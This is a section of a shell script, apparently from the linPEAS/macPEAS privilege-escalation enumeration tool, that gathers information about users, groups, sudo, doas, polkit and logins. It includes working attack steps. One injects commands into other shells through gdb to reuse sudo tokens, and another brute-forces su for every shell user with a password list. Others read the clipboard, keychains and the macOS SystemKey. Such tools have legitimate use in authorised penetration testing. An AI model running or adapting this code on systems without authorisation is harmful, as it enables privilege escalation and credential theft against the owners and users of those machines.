###########################################
#----------) Users Information (----------#
###########################################

#-- UI) My user
print_2title "My user"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users"
(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed -${E} "s,$idB,${SED_RED},g"
echo ""

if [ "$MACPEAS" ];then
  print_2title "Current user Login and Logout hooks"
  defaults read $HOME/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  echo ""

  print_2title "All Login and Logout hooks"
  defaults read /Users/*/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  defaults read /private/var/root/Library/Preferences/com.apple.loginwindow.plist
  echo ""

  print_2title "Keychains"
  print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#chainbreaker"
  security list-keychains
  echo ""

  print_2title "SystemKey"
  ls -l /var/db/SystemKey
  if [ -r "/var/db/SystemKey" ]; then 
    echo "You can read /var/db/SystemKey" | sed -${E} "s,.*,${SED_RED_YELLOW},";
    hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey | sed -${E} "s,.*,${SED_RED_YELLOW},";
  fi
  echo ""
fi

#-- UI) PGP keys?
print_2title "Do I have PGP keys?"
command -v gpg 2>/dev/null || echo_not_found "gpg"
gpg --list-keys 2>/dev/null
command -v netpgpkeys 2>/dev/null || echo_not_found "netpgpkeys"
netpgpkeys --list-keys 2>/dev/null
command -v netpgp 2>/dev/null || echo_not_found "netpgp"
echo ""

#-- UI) Clipboard and highlighted text
if [ "$(command -v xclip 2>/dev/null)" ] || [ "$(command -v xsel 2>/dev/null)" ] || [ "$(command -v pbpaste 2>/dev/null)" ] || [ "$DEBUG" ]; then
  print_2title "Clipboard or highlighted text?"
  if [ "$(command -v xclip 2>/dev/null)" ]; then
    echo "Clipboard: "$(xclip -o -selection clipboard 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
    echo "Highlighted text: "$(xclip -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  elif [ "$(command -v xsel 2>/dev/null)" ]; then
    echo "Clipboard: "$(xsel -ob 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
    echo "Highlighted text: "$(xsel -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  elif [ "$(command -v pbpaste 2>/dev/null)" ]; then
    echo "Clipboard: "$(pbpaste) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  else echo_not_found "xsel and xclip"
  fi
  echo ""
fi

#-- UI) Sudo -l
print_2title "Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid"
(echo '' | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,\!root,${SED_RED},") 2>/dev/null || echo_not_found "sudo"
if [ "$PASSWORD" ]; then
  (echo "$PASSWORD" | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g") 2>/dev/null  || echo_not_found "sudo"
fi
( grep -Iv "^$" cat /etc/sudoers | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g" ) 2>/dev/null  || echo_not_found "/etc/sudoers"
if ! [ "$IAMROOT" ] && [ -w '/etc/sudoers.d/' ]; then
  echo "You can create a file in /etc/sudoers.d/ and escalate privileges" | sed -${E} "s,.*,${SED_RED_YELLOW},"
fi
for filename in '/etc/sudoers.d/*'; do
  if [ -r "$filename" ]; then
    echo "Sudoers file: $filename is readable" | sed -${E} "s,.*,${SED_RED},g"
    grep -Iv "^$" "$filename" | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g" 
  fi
done
echo ""

#-- UI) Sudo tokens
print_2title "Checking sudo tokens"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens"
ptrace_scope="$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then echo "ptrace protection is disabled (0)" | sed "s,is disabled,${SED_RED},g";
else echo "ptrace protection is enabled ($ptrace_scope)" | sed "s,is enabled,${SED_GREEN},g";
fi
is_gdb="$(command -v gdb 2>/dev/null)"
if [ "$is_gdb" ]; then echo "gdb was found in PATH" | sed -${E} "s,.*,${SED_RED},g";
else echo "gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it" | sed "s,gdb,${SED_GREEN},g";
fi
if [ ! "$SUPERFAST" ] && [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ] && [ "$is_gdb" ]; then
  echo "Checking for sudo tokens in other shells owned by current user"
  for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" 2>/dev/null | grep -v "^$$\$"); do
    echo "Injecting process $pid -> "$(cat "/proc/$pid/comm" 2>/dev/null)
    echo 'call system("echo | sudo -S touch /tmp/shrndom32r2r >/dev/null 2>&1 && echo | sudo -S chmod 777 /tmp/shrndom32r2r >/dev/null 2>&1")' | gdb -q -n -p "$pid" >/dev/null 2>&1
    if [ -f "/tmp/shrndom32r2r" ]; then
      echo "Sudo token reuse exploit worked with pid:$pid! (see link)" | sed -${E} "s,.*,${SED_RED_YELLOW},";
      break
    fi
  done
  if [ -f "/tmp/shrndom32r2r" ]; then
    rm -f /tmp/shrndom32r2r 2>/dev/null
  else echo "The escalation didn't work... (try again later?)"
  fi
fi
echo ""

#-- UI) Doas
if [ "$(command -v doas 2>/dev/null)" ] || [ "$DEBUG" ]; then
  print_2title "Checking doas.conf"
  doas_dir_name=$(dirname "$(command -v doas)" 2>/dev/null)
  if [ "$(cat /etc/doas.conf $doas_dir_name/doas.conf $doas_dir_name/../etc/doas.conf $doas_dir_name/etc/doas.conf 2>/dev/null)" ]; then 
    cat /etc/doas.conf "$doas_dir_name/doas.conf" "$doas_dir_name/../etc/doas.conf" "$doas_dir_name/etc/doas.conf" 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_RED}," | sed "s,root,${SED_RED}," | sed "s,nopass,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW},"
  else echo_not_found "doas.conf"
  fi
  echo ""
fi

#-- UI) Pkexec policy
print_2title "Checking Pkexec policy"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2"
(cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED}," | sed -${E} "s,$groupsVB,${SED_RED}," | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW}," | sed -${E} "s,$Groups,${SED_RED_YELLOW},") || echo_not_found "/etc/polkit-1/localauthority.conf.d"
echo ""

#-- UI) Superusers
print_2title "Superusers"
awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED_YELLOW}," | sed "s,root,${SED_RED},"
echo ""

#-- UI) Users with console
print_2title "Users with console"
if [ "$MACPEAS" ]; then
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if grep -q "$ushell" /etc/shells; then #Shell user
      dscl . -read "/Users/$uname" UserShell RealName RecordName Password NFSHomeDirectory 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
      echo ""
    fi
  done
else
  no_shells=$(grep -Ev "sh$" /etc/passwd 2>/dev/null | cut -d ':' -f 7 | sort | uniq)
  unexpected_shells=""
  printf "%s\n" "$no_shells" | while read f; do
    if $f -c 'whoami' 2>/dev/null | grep -q "$USER"; then
      unexpected_shells="$f\n$unexpected_shells"
    fi
  done
  grep "sh$" /etc/passwd 2>/dev/null | sort | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  if [ "$unexpected_shells" ]; then
    printf "%s" "These unexpected binaries are acting like shells:\n$unexpected_shells" | sed -${E} "s,/.*,${SED_RED},g"
    echo "Unexpected users with shells:"
    printf "%s\n" "$unexpected_shells" | while read f; do
      if [ "$f" ]; then
        grep -E "${f}$" /etc/passwd | sed -${E} "s,/.*,${SED_RED},g"
      fi
    done
  fi
fi
echo ""

#-- UI) All users & groups
print_2title "All users & groups"
if [ "$MACPEAS" ]; then
  dscl . list /Users | while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
else
  cut -d":" -f1 /etc/passwd 2>/dev/null| while read i; do id $i;done 2>/dev/null | sort | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g"
fi
echo ""

#-- UI) Login now
print_2title "Login now"
(w || who || finger || users) 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
echo ""

#-- UI) Last logons
print_2title "Last logons"
(last -Faiw || last) 2>/dev/null | tail | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_RED}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
echo ""

#-- UI) Login info
print_2title "Last time logon each user"
lastlog 2>/dev/null | grep -v "Never" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"

EXISTS_FINGER="$(command -v finger 2>/dev/null)"
if [ "$MACPEAS" ] && [ "$EXISTS_FINGER" ]; then
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if grep -q "$ushell" /etc/shells; then #Shell user
      finger "$uname" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
      echo ""
    fi
  done
fi
echo ""

#-- UI) Password policy
if [ "$EXTRA_CHECKS" ]; then
  print_2title "Password policy"
  grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null || echo_not_found "/etc/login.defs"
  echo ""

  if [ "$MACPEAS" ]; then
    print_2title "Relevant last user info and user configs"
    defaults read /Library/Preferences/com.apple.loginwindow.plist 2>/dev/null
    echo ""

    print_2title "Guest user status"
    sysadminctl -afpGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    sysadminctl -guestAccount status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    sysadminctl -smbGuestAccess status | sed -${E} "s,enabled,${SED_RED}," | sed -${E} "s,disabled,${SED_GREEN},"
    echo ""
  fi
fi

#-- UI) Brute su
EXISTS_SUDO="$(command -v sudo 2>/dev/null)"
if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ] && ! [ "$IAMROOT" ] && [ "$EXISTS_SUDO" ]; then
  print_2title "Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
  POSSIBE_SU_BRUTE=$(check_if_su_brute);
  if [ "$POSSIBE_SU_BRUTE" ]; then
    SHELLUSERS=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
    printf "%s\n" "$SHELLUSERS" | while read u; do
      echo "  Bruteforcing user $u..."
      su_brute_user_num "$u" $PASSTRY
    done
  else
    printf $GREEN"It's not possible to brute-force su.\n\n"$NC
  fi
else
  print_2title "Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)\n"$NC
fi
print_2title "Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!\n"$NC
